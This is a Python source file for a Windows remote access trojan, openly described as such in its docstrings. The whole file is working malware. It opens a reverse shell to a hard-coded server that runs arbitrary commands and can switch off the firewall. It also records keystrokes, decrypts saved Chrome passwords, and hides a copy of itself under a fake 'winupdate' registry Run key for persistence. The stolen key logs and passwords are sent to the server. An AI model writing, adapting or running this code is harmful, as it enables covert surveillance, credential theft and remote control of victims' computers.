import socket
import os
from time import sleep
import base64
import json
import sqlite3
import win32crypt
import Cryptodome.Cipher.AES
import socket
import time
from pynput.keyboard import Key, Listener
import logging
import subprocess
import ctypes
import os
import shutil
import sys
import winreg


class Startup:
    """
    Adds or removes RAT to startup apps
    """

    def __init__(self) -> None:
        """
        Constructor to create Startup project from which we can call the methods
        """
        pass

    def add_startup(self) -> None:
        """
        Adds .exe RAT file to startup using Window's registry
        """
        # Get the file path of the current executable
        file_path = os.path.realpath(sys.argv[0])
        # Assign the new path of the malware and copy the file there
        hidden_path = os.path.join(os.path.normpath(os.environ["APPDATA"]), os.path.basename(file_path))
        shutil.copyfile(file_path, hidden_path)
        # Open the windows registry key for startup executions, set a new value to run the malware on startup and close
        regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0, winreg.KEY_ALL_ACCESS)

        winreg.SetValueEx(regkey, "winupdate_owaL9", 0, winreg.REG_SZ, f"\"{hidden_path}\"")
        winreg.CloseKey(regkey)
    
    def remove_startup(self) -> None:
        """
        Removes .exe file from startup by deleting windows registry key
        """
        # Opens the windows registry key, removes the value for malware run on startup and closes the registry editor.
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, winreg.KEY_ALL_ACCESS)

        winreg.DeleteValue(key, "winupdate_owaL9")
        winreg.CloseKey(key)


class Shell:
    """
    Gets a simple reverse shell back to host
    """

    def __init__(self, sock: socket) -> None:
        """
        Constructor

        :param sock: The socket to send the data through
        """
        self.sock = sock

    def get_shell(self) -> None:
        """
        Executes received commands from the server and sends the output back through the socket
        """

        welcome_msg = "\nReverse shell connection successful! \n Type '!help' for list of custom commands, \
        and 'exit' or 'quit' to return \
        Custom commands start with '!'\n"

        self.sock.send(str.encode(welcome_msg))

        while 1:
            try:
                # Gets cwd and sends to server
                self.sock.send(str.encode(os.getcwd() + "# "))

                # Receives messages from server
                data = self.sock.recv(1024).decode("UTF-8")
                data = data.strip('\n')

                # opens help menu
                if data == "!help":
                    help_msg = "\nCustom commands are: \
                    \n!PS [command]: Execute command with powershell \
                    \n!firewall on/off: Turns on/off firewall \
                    \n!lock: Locks screen of client \
                    \n!help: Opens this menu\n"

                    self.sock.send(str.encode(help_msg))

                # Exits shell
                if data == "quit" or data == "exit":
                    break

                # Changes directory
                if data[:2] == "cd":
                    os.chdir(data[3:])

                # Lists cwd with ls
                if data == "ls":
                    data = "dir"

                # Disables/enables firewall
                if data == "!firewall off":
                    data = "netsh advfirewall set currentprofile state off"
                if data == "!firewall on":
                    data = "netsh advfirewall set currentprofile state on"

                # Locks the screen of client
                if data == "!lock":
                    ctypes.windll.user32.LockWorkStation()
                    data = "echo Screen locked"

                # Executes command with powershell
                if data[:3] == "!PS":
                    data = "PowerShell.exe -command {}".format(data[4:])

                if len(data) > 0 and not data == "!help":
                    # Executes arbitrary command
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    output_str = str(stdout_value, "UTF-8")

                    # Sends output back to server
                    self.sock.send(str.encode("\n" + output_str))

            except socket.error:
                break


class KeyLogger:
    """
    Logs key presses to a file
    """

    def __init__(self, keylog_filename: str) -> None:
        """
        Constructor

        :param keylog_filename: The name of the file to store the key logs
        """

        self.keylog_filename = keylog_filename

        # Init listener
        self.listener = Listener(on_press=self._keypress_callback)

    def _keypress_callback(self, key: Key) -> None:
        """
        Callback function for each keypress

        :param key: Key pressed
        """
        logging.info(str(key))

    def start_log(self) -> None:
        """
        Starts logging key presses
        """

        # Initialize listener
        self.listener = Listener(on_press=self._keypress_callback)

        # logging config
        logging.disable(logging.NOTSET)
        logging.basicConfig(filename=self.keylog_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

        self.listener.start()

    def end_log(self) -> None:
        """
        Stops logging key pressed
        """
        # Disable logging calls
        logging.shutdown()

        self.listener.stop()


class Connection:
    """
    Opens a socket connection between server and client
    """

    def __init__(self, host: str, port: int) -> None:
        """
        Constructor

        :param host: IP of server
        :param port: Port of server
        """

        self.host = host
        self.port = port

        # Selects family IPv4 to connect to with TCP
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self) -> socket:
        """
        Creates socket connection between client and server
        """

        # Creates tuple with address and port
        server_address = (self.host, self.port)  

        while 1:  # Try until it connects
            try:
                # Connect to host
                self.sock.connect(server_address)
                break
            except socket.error:
                # Wait 5 seconds and retry
                time.sleep(5)

        # Connection successful
        self.sock.send(str.encode("Successfully connected\n"))

        return self.sock


class ChromePass:
    """
    Collects saved chrome passwords from device
    """

    def __init__(self, chromepass_filename: str) -> None:
        """
        Constructor

        :param chromepass_filename: The name of the file to save the log to
        """
        self.chromepass_filename = chromepass_filename

    def get_key(self) -> str:
        """
        Gets the key to decrypt the chrome data
        """
        # Load the google chrome local state file and read it as a json
        local_state_file = r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE'])
        local_state = json.loads(open(local_state_file).read())
        # Locate the secret key and decode it so it is usable
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Filter the key from the first few letters which are not part of the key and decrypt it with the 
        # user specific microsoft function CryptUnprotectData 
        key = key[5:]
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return key

    def decrypt(self, raw_encrypted, key: str) -> str:
        """
        Decrypts the data from chrome

        :param raw_encrypted: The raw passsword from the login data file
        :param key: The secret key for deciphering
        """

        # Get the AES initializations vector
        AES_vector = raw_encrypted[3:15]
        # Encrypted passowrf is 192 bits so we remove the unnecessary suffix
        encrypted = raw_encrypted[15:-16]
        # Get the cipher, decrypt the raw password and decode it
        cipher = Cryptodome.Cipher.AES.new(key, Cryptodome.Cipher.AES.MODE_GCM, AES_vector)
        decrypted = cipher.decrypt(encrypted)
        decrypted = decrypted.decode()
        return decrypted

    def get_chrome_pass(self) -> None:
        """
        Function to get the passwords stored in Google Chrome
        """
        # String where the data will be loaded into
        login_data = ""
        # Path to the file where the credinitials are saved
        path = r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data" % (os.environ['USERPROFILE'])
        key = self.get_key()
        # Temporary file copy
        shutil.copy2(path, "logindata.db")
        # Use sqlite3 to load the file as a database and select only relevant information
        conn = sqlite3.connect("logindata.db")
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        # Loop through all the elements selected and add the username, url and decrypted passwords and then clsoe eevrything down
        for element in cursor.fetchall():
            if element[0] != "" and element[1] != "" and element[2] != "":
                login_data += "\n\nDomain: " + element[0] + "\n   user: " + element[1] + "\n    Pass: " + self.decrypt(
                    element[2], key)
        cursor.close()
        conn.close()
        os.remove("logindata.db")

        # Write passwords to a file
        with open(self.chromepass_filename, "w") as f:
            f.write(login_data)

class Client:
    """
    Performs all necessary actions for the RAT to function:
        - Creates socket
        - Gets passwords from Google Chrome
        - Logs key events to a file
        - Gets a reverse shell back to the server
    """

    def __init__(self, host: str, port: int = 9001, file_port: int = 9002, keylog_filename: str = ".activity.txt",
                 chromepass_filename: str = ".chrome_log.txt") -> None:
        """
        Constructor

        required:
        :param host: The server's IP
        
        optional:
        :param port: The server's port number for main connection
        :param file_port: The port number used for the file transfer
        :param keylog_filename: The file's name where the keystrokes are stored
        :param chromepass_filename: The file name where the chrome passwords are stored
        """

        self.host = host
        self.port = port
        self.file_port = file_port
        self.keylog_filename = keylog_filename
        self.chromepass_filename = chromepass_filename

        # Create client instance
        self.client = Connection(self.host, self.port)

        # Open socket connection back to server
        self.sock = self.client.connect()

        # Create shell instance
        self.shell = Shell(self.sock)

        # Create google password collector instance
        self.chrome_pass = ChromePass(self.chromepass_filename)

        # Initialize keylogger instance
        self.keylogger = KeyLogger(self.keylog_filename)

        # Initialize startup instance
        self.startup = Startup()

    def run(self) -> None:
        """
        Opens menu and performs features
        """

        while 1:

            try:
                # Opens menu
                choice = self.open_menu()

                if choice == 1:
                    self.shell.get_shell()

                elif choice == 2:
                    self.keylogger.start_log()
                    self.send_data("\n\nKey logging started to file '{}'...".format(self.keylog_filename), self.sock)

                elif choice == 3:
                    self.keylogger.end_log()
                    self.send_data("\n\nKey logging stopped...", self.sock)

                elif choice == 4:
                    self.chrome_pass.get_chrome_pass()
                    self.send_data("\n\nChrome passwords saved to file '{}'...".format(self.chromepass_filename),
                                   self.sock)

                elif choice == 5:
                    self.startup.add_startup()
                    self.send_data("\n\nProgram added to startup successfully...", self.sock)

                elif choice == 6:
                    self.startup.remove_startup()
                    self.send_data("\n\nProgram removes from startup successfully...", self.sock)

                elif choice == 7:
                    self.send_file(self.keylog_filename)
                    self.send_data("\n\n{} sent and deleted from client...".format(self.keylog_filename), self.sock)

                elif choice == 8:
                    self.send_file(self.chromepass_filename)
                    self.send_data("\n\n{} sent and deleted from client...".format(self.chromepass_filename), self.sock)

            # Connection error handling (e.g. server presses Ctrl-C)
            except (ConnectionResetError, ConnectionAbortedError, ConnectionError):
                self.sock.close()
                break

    def open_menu(self) -> int:
        """
        Opens the selection menu to the server
        
        :returns: The choice of the menu
        """

        response = ""

        # Opens menu
        menu_str = "\nPlease select one of the functionalities from the following menu: \n \n \
            1) Get a reverse shell \n \
            2) Start keylogger \n \
            3) Stop keylogger \n \
            4) Get chrome passwords \n \
            5) Add RAT to startup \n \
            6) Remove RAT from startup \n \
            7) Receive keylogger file \n \
            8) Receive chrome passwords file \n\n \
            \n Choice: "

        self.send_data(menu_str, self.sock)

        # Receives messages from server
        response = self.receive_data(self.sock)

        # Try to convert to int
        try:
            response = int(response)
        except ValueError:
            pass

        # Check valid response
        if response not in [1, 2, 3, 4, 5, 6, 7, 8]:
            self.send_data("\nNot a valid response!\n", self.sock)
            self.open_menu()

        return response

    def send_data(self, data: str, sock: socket) -> None:
        """
        Sends data through socket

        :param data: The data to send
        :param sock: The socket to use
        """
        sock.send(str.encode(data))

    def receive_data(self, sock: socket) -> str:
        """
        Receives data through socket

        :param sock: The socket to use

        :returns: The received data
        """

        # Wait until data is received
        data = sock.recv(1024).decode("UTF-8")

        return data

    def send_file(self, filename: str) -> None:

        response = ""

        # Instructions
        self.send_data(f"\nTo receive file {filename}: \n \
        run command in another terminal:\n \
        nc -l -p {self.file_port} > {filename} \n", self.sock)

        # Wait for enter press
        while not response == "\n":
            self.send_data("Press enter to send file {}: ".format(filename), self.sock)
            response = self.receive_data(self.sock)

        # Create file client instance
        file_client = Connection(self.host, self.file_port)

        # Open socket connection for file transfer
        file_sock = file_client.connect()

        # Open and read file
        with open(filename, "r") as f:
            file_content = f.read()

        # Remove file from client
        os.remove(filename)

        # Send the file data to server
        self.send_data(file_content, file_sock)

        # Close connection when finished
        file_sock.close()


if __name__ == "__main__":
    # Run RAT with specified IP and port continuously
    while 1:
        Client("10.0.2.15").run()
